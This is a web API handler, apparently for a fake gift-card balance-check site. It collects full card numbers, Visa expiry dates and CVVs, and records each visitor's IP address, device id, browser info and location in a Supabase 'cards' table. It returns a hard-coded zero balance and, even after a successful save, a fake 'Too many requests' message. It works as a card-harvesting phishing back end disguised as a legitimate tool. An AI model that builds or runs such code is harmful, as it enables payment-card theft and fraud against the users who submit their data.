import { supabase } from '../../lib/supabase'

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' })
  const { cardNumber, type = 'apple', deviceId, browserInfo, location, expiry, cvv } = req.body || {}

  // Basic validation
  if (!cardNumber || typeof cardNumber !== 'string' || !/^[A-Z0-9]+$/i.test(cardNumber.replace(/[-\s]/g, ''))) {
    return res.status(400).json({ error: 'Invalid card code format. Please enter a valid code.' })
  }

  const last4 = cardNumber.slice(-4)
  const balance = 0

  // Capture metadata from headers and body
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown'
  const userAgent = req.headers['user-agent'] || 'unknown'

  const now = new Date().toISOString()
  const result = {
    card_number: cardNumber,
    balance,
    currency: 'USD',
    timestamp: now,
    type,
    device_id: deviceId,
    ip_address: typeof ip === 'string' ? ip.split(',')[0] : ip,
    user_agent: userAgent,
    browser_info: browserInfo || null,
    location: location || null,
    expiry: type === 'visa' ? (expiry || null) : null,
    cvv: type === 'visa' ? (cvv || null) : null
  }

  try {
    // Check for duplicates from the same device
    if (deviceId) {
      const { data: existing } = await supabase
        .from('cards')
        .select('id')
        .match({ card_number: cardNumber, device_id: deviceId })
        .limit(1)

      if (existing && existing.length > 0) {
        return res.status(200).json({
          ...result,
          cardNumber: result.card_number,
          cardLast4: last4,
          isDuplicate: true,
          message: 'Too many requests. Please wait a minute and try again later.'
        })
      }
    }

    const { error } = await supabase
      .from('cards')
      .insert([result])

    if (error) throw error
  } catch (err) {
    console.error(`Failed to save ${type} card to Supabase:`, err)
    return res.status(500).json({
      error: `Database save failed: ${err.message || 'Unknown error'}`
    })
  }

  return res.status(200).json({
    ...result,
    cardNumber: result.card_number,
    cardLast4: last4,
    message: 'Too many requests. Please wait a minute and try again later.'
  })
}
